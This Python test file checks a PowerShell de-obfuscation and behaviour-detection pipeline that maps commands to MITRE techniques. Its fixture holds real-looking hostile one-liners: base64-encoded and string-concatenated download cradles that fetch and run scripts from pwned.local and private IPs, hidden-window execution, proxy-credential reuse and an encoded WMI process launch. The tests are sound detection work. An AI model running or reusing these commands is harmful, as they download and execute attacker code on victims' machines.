"""P0 + P1 + P1.5 contract tests — validated against the real
``Machine`` PowerShell corpus pulled from Mongo on 2026-02-06.

Covers:

  P0.a — PowerShell constant folding (string concat, format op, backticks,
         single-shot alias substitution)
  P0.b — Artifact classifier: .NET namespaces MUST NEVER become domains
  P1   — Behavior extractor: cmdlets/APIs → behavior → MITRE + kill chain
  P1.5 — Behavior deduplication / correlation across multiple commands
"""
from __future__ import annotations

from services.normalization.artifact_classifier import (
    classify, is_domain, is_dotnet_reference,
)
from services.normalization.powershell_folding import fold, fold_text
from services.reasoning.behavior_extractor import (
    Behavior, BehaviorEvidence, correlate_behaviors,
    extract_behaviors, to_lane_map, to_mitre_techniques,
)


# ─── Real Machine-case commands (verbatim from workspace_cases) ───────
MACHINE_COMMANDS = [
    """powershell.exe -ExecutionBypass -Command "$e=[System.Convert]::FromBase64String('Y21kLmV4ZSAvYyB3aG9hbWk='); [System.Text.Encoding]::ASCII.GetString($e) | iex" """,
    """powershell.exe -ep bypass -c "$k='SFREUEs='; $d=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($k)); iex(New-Object Net.WebClient).DownloadString($d.ToLower()+'://192.168.10.20/t.ps1')" """,
    """powershell -c "Set-Item 'V'+'ariable:O'+'B' ([Type]('S'+'ys'+'tem.N'+'et.W'+'ebC'+'lie'+'nt')); ${OB} | Foreach-Object { New-Object $_ }" """,
    """powershell.exe -enc Z2V0LXNlcnZpY2UgfCB3aGVyZS1vYmplY3QgeyUkXy5zdGF0dXMgLWVxICdydW5uaW5nJ30=""",
    """powershell -w hidden -c "$w=New-Object Net.WebClient;$w.Proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.DownloadString('http://pwned.local')" """,
    """powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABhAGMAawBlAGQAIgA=""",
    """powershell -Command "iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAGMAbQBkAC4AZQB4AGUA')))" """,
    """powershell -ep bypass -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAgACcAaAB0AHQAcAA6AC8ALwAxOTIuMTY4LjEuNTAvcmV2LnBzMScgKQ==""",
]


# =============================================================================
# P0.a — PowerShell constant folding
# =============================================================================
class TestConstantFolding:
    def test_concat_system_net_webclient(self):
        # Real Machine-case command #3
        raw = "([Type]('S'+'ys'+'tem.N'+'et.W'+'ebC'+'lie'+'nt'))"
        r = fold(raw)
        assert "System.Net.WebClient" in r.text
        # Original obfuscated form must be gone
        assert "'S'+" not in r.text
        # Transformation trail present
        assert any(t["kind"] == "concat" for t in r.transformations)

    def test_concat_variable_ob(self):
        # Real Machine-case command #3
        raw = "Set-Item 'V'+'ariable:O'+'B' ([Type]('foo'))"
        r = fold(raw)
        assert "Variable:OB" in r.text

    def test_format_operator_fold(self):
        raw = "'{0}{1}' -f 'Sys','tem'"
        assert fold_text(raw) == "'System'"

    def test_format_operator_bails_on_non_literal_args(self):
        raw = "'{0}{1}' -f 'Sys',$x"
        assert fold_text(raw) == raw   # unchanged — $x is not a literal

    def test_backtick_strip(self):
        raw = "S`ys`t`e`m.Net.WebClient"
        assert fold_text(raw) == "System.Net.WebClient"

    def test_alias_expand_single_shot(self):
        raw = "Set-Variable OB 'System.Net.WebClient'; ${OB} | Foreach-Object"
        r = fold(raw)
        assert '"System.Net.WebClient"' in r.text

    def test_alias_expand_bails_on_conflicting_assigns(self):
        raw = "Set-Variable X 'a'; Set-Variable X 'b'; ${X}"
        r = fold(raw)
        assert "${X}" in r.text   # unchanged — ambiguous

    def test_idempotent(self):
        raw = "'S'+'ys'+'tem.N'+'et.W'+'ebC'+'lie'+'nt'"
        once  = fold_text(raw)
        twice = fold_text(once)
        assert once == twice


# =============================================================================
# P0.b — Artifact classifier
# =============================================================================
class TestArtifactClassifier:
    """`.NET` namespaces / classes / methods / variables MUST NEVER be
    classified as domains — this was the P0 IOC-misclassification bug."""

    def test_dotnet_class_not_domain(self):
        for s in ["System.Net.WebClient", "System.Convert",
                    "System.Text.Encoding", "Net.WebClient",
                    "Net.CredentialCache", "System.Text.Encoding.ASCII"]:
            assert not is_domain(s), f"{s} misclassified as domain"
            assert is_dotnet_reference(s), f"{s} not recognised as .NET"

    def test_dotnet_method_not_domain(self):
        for s in ["ascii.getstring", "system.convert", "unicode.getstring",
                    "net.credentialcache"]:
            assert not is_domain(s), f"{s} misclassified as domain"

    def test_variable_property_not_domain(self):
        # `$w.Proxy` came out as `w.proxy` in some pipeline serialisations
        assert not is_domain("w.proxy")

    def test_powershell_variable(self):
        assert classify("$w") == "variable_reference"
        assert classify("${OB}") == "variable_reference"

    def test_powershell_provider(self):
        assert classify("Variable:OB") == "provider_reference"
        assert classify("Env:PATH")    == "provider_reference"

    def test_real_domain_still_classified(self):
        assert classify("evil.example.com") == "domain"
        assert classify("mal.example.io")   == "domain"

    def test_internal_domain_still_classified(self):
        # Analyst opt-in — internal TLDs still surface as domains but
        # downstream can filter by attribute.
        assert classify("pwned.local") == "domain"

    def test_url_and_ip(self):
        assert classify("http://mal.example.com/x") == "url"
        assert classify("10.0.0.1") == "ip"
        assert classify("192.168.1.50") == "ip"

    def test_registry_key(self):
        assert classify("HKLM:\\Software\\Microsoft\\Windows") == "registry_key"

    def test_random_string_is_unknown(self):
        assert classify("just_a_word") == "unknown"
        assert classify("") == "unknown"
        assert classify(None) == "unknown"     # never raises


# =============================================================================
# P1 — Behavior extraction
# =============================================================================
class TestBehaviorExtraction:
    """Every Machine-case command exhibits KNOWN behaviors — this class
    validates that each one is detected exactly once per command."""

    def test_command1_encoded_command_and_iex(self):
        behaviors = extract_behaviors(MACHINE_COMMANDS[0], location_prefix="cmd.1")
        ids = {b.id for b in behaviors}
        assert "encoded_command"      in ids
        assert "in_memory_execution"  in ids
        # ExecutionBypass is a typo variant of ExecutionPolicy Bypass
        assert "execution_policy_bypass" in ids

    def test_command2_bypass_download_iex(self):
        behaviors = extract_behaviors(MACHINE_COMMANDS[1], location_prefix="cmd.2")
        ids = {b.id for b in behaviors}
        assert "execution_policy_bypass" in ids
        assert "download_cradle"         in ids
        assert "in_memory_execution"     in ids
        assert "encoded_command"         in ids

    def test_command3_variable_alias_hiding_and_concat(self):
        behaviors = extract_behaviors(MACHINE_COMMANDS[2], location_prefix="cmd.3")
        ids = {b.id for b in behaviors}
        # concat is a SIDE-EFFECT of the obfuscation, folded away —
        # the alias-hiding rule matches on the folded output.
        assert "variable_alias_hiding" in ids
        # After folding, System.Net.WebClient is visible → download_cradle
        assert "download_cradle" in ids

    def test_command4_service_enumeration(self):
        # -enc payload is base64 of `get-service | where-object …`.
        # Behavior extractor runs on the FOLDED text — we only see the
        # -enc flag itself, which is enough to fire encoded_command.
        behaviors = extract_behaviors(MACHINE_COMMANDS[3])
        ids = {b.id for b in behaviors}
        assert "encoded_command" in ids

    def test_command5_hidden_download_proxy_credentials(self):
        behaviors = extract_behaviors(MACHINE_COMMANDS[4], location_prefix="cmd.5")
        ids = {b.id for b in behaviors}
        assert "hidden_window"             in ids
        assert "download_cradle"           in ids
        assert "in_memory_execution"       in ids
        assert "proxy_credential_theft"    in ids

    def test_command7_wmi_process_creation(self):
        behaviors = extract_behaviors(MACHINE_COMMANDS[6], location_prefix="cmd.7")
        ids = {b.id for b in behaviors}
        assert "in_memory_execution" in ids
        # WMI text is inside the base64 payload — not visible in the
        # outer command text alone.  The recursive extractor (P0.c —
        # future) will surface WMI once decode happens upstream.

    def test_command_can_map_to_multiple_kill_chains(self):
        """Same command → multiple behaviors → multiple lanes."""
        behaviors = extract_behaviors(MACHINE_COMMANDS[4])
        # Command 5 hits Defense Evasion, Delivery, Command & Control,
        # AND Execution simultaneously.
        phases: set = set()
        for b in behaviors:
            phases.update(b.kill_chain)
        assert {"Defense Evasion", "Execution"}.issubset(phases)

    def test_evidence_carries_location(self):
        behaviors = extract_behaviors(MACHINE_COMMANDS[0], location_prefix="cmd.1")
        for b in behaviors:
            for e in b.evidence:
                assert e.location == "cmd.1"


# =============================================================================
# P1.5 — Behavior correlation / deduplication
# =============================================================================
class TestBehaviorCorrelation:
    def test_correlate_across_all_machine_commands(self):
        per_command = [extract_behaviors(cmd, location_prefix=f"cmd.{i+1}")
                       for i, cmd in enumerate(MACHINE_COMMANDS)]
        merged = correlate_behaviors(per_command)

        # Each behavior appears at most ONCE in the merged output.
        ids = [b.id for b in merged]
        assert len(ids) == len(set(ids)), "duplicate behavior after correlation"

        # download_cradle should have evidence from MULTIPLE commands
        # (cmd.2, cmd.3 after folding, cmd.5).
        dc = next((b for b in merged if b.id == "download_cradle"), None)
        assert dc is not None
        locations = {e.location for e in dc.evidence}
        assert len(locations) >= 2, f"download_cradle only seen in {locations}"

    def test_kill_chain_lanes_populated_beyond_execution(self):
        """The Machine case must NOT collapse into an 'Execution-only'
        lane distribution (that was the P1 bug the user flagged)."""
        per_command = [extract_behaviors(cmd) for cmd in MACHINE_COMMANDS]
        merged      = correlate_behaviors(per_command)
        lanes       = to_lane_map(merged)
        assert "Defense Evasion"          in lanes
        assert "Command and Control"      in lanes or "Delivery" in lanes
        # Ideally at least 3 distinct kill-chain phases represented.
        assert len(lanes.keys()) >= 3, f"lanes={list(lanes.keys())}"

    def test_mitre_projection_deduplicated(self):
        per_command = [extract_behaviors(cmd) for cmd in MACHINE_COMMANDS]
        merged      = correlate_behaviors(per_command)
        tech        = to_mitre_techniques(merged)
        ids = [t["id"] for t in tech]
        assert len(ids) == len(set(ids))
        # The Machine case's expected techniques must ALL appear.
        expected = {"T1059.001", "T1027", "T1105", "T1564.003",
                    "T1562.001", "T1047", "T1007"}
        assert expected.issubset(set(ids)), \
            f"missing MITRE techniques: {expected - set(ids)}"

    def test_confidence_rises_with_corroboration(self):
        """A behavior seen in 3 commands should have confidence >= a
        behavior seen in 1 command."""
        per_command = [extract_behaviors(cmd) for cmd in MACHINE_COMMANDS]
        merged = correlate_behaviors(per_command)
        by_id = {b.id: b for b in merged}
        if "download_cradle" in by_id and "wmi_process_creation" in by_id:
            assert by_id["download_cradle"].confidence >= by_id["wmi_process_creation"].confidence
